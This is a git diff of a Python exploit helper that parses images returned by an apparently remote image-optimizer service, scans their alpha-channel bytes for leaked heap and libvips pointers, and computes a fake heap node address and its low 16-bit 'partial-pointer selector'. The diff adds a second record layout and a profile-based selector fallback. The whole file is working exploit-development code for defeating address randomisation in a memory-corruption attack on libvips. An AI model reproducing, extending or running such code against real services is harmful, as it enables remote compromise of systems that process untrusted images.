@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Derive the plane-map partial-pointer selector from returned pixels."""
+"""Resolve the plane-map selector from returned pixels and strict profiles."""
 
 from __future__ import annotations
 
@@ -13,8 +13,6 @@ from stack_profile import NativeStackProfile
 
 
 _QWORD = struct.Struct("<Q")
-_RECORD_BEFORE = 6
-_RECORD_AFTER = 6
 
 
 def _qword(alpha: bytes, position: int) -> int:
@@ -26,7 +24,44 @@ def _in_pointer_range(value: int, profile: NativeStackProfile) -> bool:
     return leak.pointer_min <= value < leak.pointer_max
 
 
-def _match_record(
+def _record_result(
+    *,
+    position: int,
+    anchor: int,
+    related: int,
+    peer: int,
+    profile: NativeStackProfile,
+    libvips_references: tuple[int, int, int],
+    extra: dict[str, object],
+) -> dict[str, object] | None:
+    calibration = profile.heap_calibration
+    arena_base = anchor & ~(calibration.arena_alignment - 1)
+    anchor_page = anchor & ~(calibration.anchor_alignment - 1)
+    fake_node = anchor_page + calibration.fake_node_delta_from_anchor_page
+    if fake_node & ~(calibration.arena_alignment - 1) != arena_base:
+        return None
+    return {
+        "response_offset": hex(position),
+        "arena_base": hex(arena_base),
+        "related_pointer": hex(related),
+        "anchor": hex(anchor),
+        "anchor_page": hex(anchor_page),
+        "anchor_page_offset": hex(anchor - anchor_page),
+        "anchor_page_low16": hex(anchor_page & 0xFFFF),
+        "anchor_alignment": hex(calibration.anchor_alignment),
+        "peer": hex(peer),
+        "peer_delta": hex(peer - anchor),
+        "libvips_references": [hex(value) for value in libvips_references],
+        "fake_node_delta_from_anchor_page": hex(
+            calibration.fake_node_delta_from_anchor_page
+        ),
+        "derived_fake_node": hex(fake_node),
+        "derived_selector": hex(fake_node & 0xFFFF),
+        **extra,
+    }
+
+
+def _match_marked_record(
     alpha: bytes,
     position: int,
     profile: NativeStackProfile,
@@ -65,32 +100,79 @@ def _match_record(
     )
     if not all(checks):
         return None
-    anchor_page = anchor & ~(calibration.anchor_alignment - 1)
-    fake_node = anchor_page + calibration.fake_node_delta_from_anchor_page
-    if fake_node & ~(calibration.arena_alignment - 1) != arena_base:
+    return _record_result(
+        position=position,
+        anchor=anchor,
+        related=related,
+        peer=peer,
+        profile=profile,
+        libvips_references=expected_libvips,
+        extra={
+            "arena_sentinel": hex(
+                arena_base + calibration.arena_sentinel_offset
+            ),
+            "related_pointer_delta": hex(related_delta),
+            "record_marker": hex(calibration.record_marker),
+        },
+    )
+
+
+def _match_pie_tail_record(
+    alpha: bytes,
+    position: int,
+    profile: NativeStackProfile,
+    libvips_base: int,
+) -> dict[str, object] | None:
+    calibration = profile.heap_calibration
+    prefix = tuple(
+        _qword(alpha, position - (9 - index) * 8)
+        for index in range(6)
+    )
+    if prefix != calibration.record_prefix_qwords:
         return None
-    selector = fake_node & 0xFFFF
-    return {
-        "response_offset": hex(position),
-        "arena_base": hex(arena_base),
-        "arena_sentinel": hex(
-            arena_base + calibration.arena_sentinel_offset
-        ),
-        "related_pointer": hex(related),
-        "related_pointer_delta": hex(related_delta),
-        "anchor": hex(anchor),
-        "anchor_page": hex(anchor_page),
-        "anchor_alignment": hex(calibration.anchor_alignment),
-        "peer": hex(peer),
-        "peer_delta": hex(calibration.anchor_peer_delta),
-        "libvips_references": [hex(value) for value in expected_libvips],
-        "record_marker": hex(calibration.record_marker),
-        "fake_node_delta_from_anchor_page": hex(
-            calibration.fake_node_delta_from_anchor_page
-        ),
-        "derived_fake_node": hex(fake_node),
-        "derived_selector": hex(selector),
-    }
+    expected_libvips = tuple(
+        libvips_base + offset
+        for offset in calibration.libvips_record_offsets
+    )
+    if (
+        _qword(alpha, position) != expected_libvips[0]
+        or _qword(alpha, position + 1 * 8) != expected_libvips[1]
+        or _qword(alpha, position + 3 * 8) != 0
+        or _qword(alpha, position + 4 * 8) != expected_libvips[2]
+    ):
+        return None
+    anchor = _qword(alpha, position - 3 * 8)
+    related = _qword(alpha, position - 2 * 8)
+    peer = _qword(alpha, position - 1 * 8)
+    if not all(
+        _in_pointer_range(value, profile)
+        for value in (anchor, related, peer)
+    ):
+        return None
+    if peer != anchor + calibration.anchor_peer_delta:
+        return None
+    anchor_page = anchor & ~(calibration.anchor_alignment - 1)
+    anchor_page_offset = anchor - anchor_page
+    if not (
+        calibration.anchor_page_offset_min
+        <= anchor_page_offset
+        < calibration.anchor_page_offset_max
+    ):
+        return None
+    if anchor_page & 0xFFFF != calibration.anchor_page_low16:
+        return None
+    return _record_result(
+        position=position,
+        anchor=anchor,
+        related=related,
+        peer=peer,
+        profile=profile,
+        libvips_references=expected_libvips,
+        extra={
+            "record_prefix_qwords": [hex(value) for value in prefix],
+            "variable_marker": hex(_qword(alpha, position + 2 * 8)),
+        },
+    )
 
 
 def analyze_heap_calibration(
@@ -109,29 +191,74 @@ def analyze_heap_calibration(
     except (OSError, UnidentifiedImageError) as error:
         raise ValueError("optimizer response is not a decodable image") from error
 
-    leak = profile.libvips.leak
-    start = max(leak.scan_start, _RECORD_BEFORE * 8)
+    calibration = profile.heap_calibration
+    if calibration.record_variant == "marked_arena":
+        record_before, record_after = 6, 6
+        matcher = _match_marked_record
+    else:
+        record_before, record_after = 9, 4
+        matcher = _match_pie_tail_record
+    start = max(calibration.scan_start, record_before * 8)
     end = min(
-        leak.scan_end,
-        len(alpha) - (_RECORD_AFTER + 1) * 8 + 1,
+        calibration.scan_end,
+        len(alpha) - (record_after + 1) * 8 + 1,
     )
     matches = []
     if start < end:
-        for position in range(start, end, leak.scan_step):
-            match = _match_record(alpha, position, profile, libvips_base)
+        for position in range(start, end, 8):
+            match = matcher(alpha, position, profile, libvips_base)
             if match is not None:
                 matches.append(match)
 
-    matches.sort(key=lambda match: int(str(match["anchor"]), 0))
-    rank = profile.heap_calibration.anchor_rank
-    selectors = (
-        [matches[rank]["derived_selector"]] if rank < len(matches) else []
-    )
+    if calibration.record_variant == "marked_arena":
+        matches.sort(key=lambda match: int(str(match["anchor"]), 0))
+        rank = calibration.anchor_rank
+        record_selectors = (
+            [matches[rank]["derived_selector"]] if rank < len(matches) else []
+        )
+    else:
+        rank = None
+        record_selectors = sorted({match["derived_selector"] for match in matches})
+    profile_selector = None
+    profile_selector_evidence = None
+    if calibration.selector_strategy == "profile_page_lane":
+        profile_selector = hex(
+            (
+                calibration.anchor_page_low16
+                + calibration.fake_node_delta_from_anchor_page
+            )
+            & 0xFFFF
+        )
+        selectors = sorted({*record_selectors, profile_selector})
+        profile_selector_evidence = {
+            "anchor_page_low16": hex(calibration.anchor_page_low16),
+            "fake_node_delta_from_anchor_page": hex(
+                calibration.fake_node_delta_from_anchor_page
+            ),
+            "derivation": (
+                f"({calibration.anchor_page_low16:#x} + "
+                f"{calibration.fake_node_delta_from_anchor_page:#x}) "
+                f"& 0xffff = {profile_selector}"
+            ),
+        }
+        selector_source = (
+            "profile_page_lane_and_returned_record"
+            if record_selectors else "profile_page_lane"
+        )
+    else:
+        selectors = record_selectors
+        selector_source = "returned_record"
     status = "no_match" if not selectors else "candidates"
     return {
         "status": status,
         "profile_id": profile.profile_id,
         "libvips_base": hex(libvips_base),
+        "record_variant": calibration.record_variant,
+        "selector_strategy": calibration.selector_strategy,
+        "selector_source": selector_source,
+        "profile_candidate_selector": profile_selector,
+        "profile_selector_evidence": profile_selector_evidence,
+        "record_candidate_selectors": record_selectors,
         "response_sha256": hashlib.sha256(image_bytes).hexdigest(),
         "image": {
             "width": width,
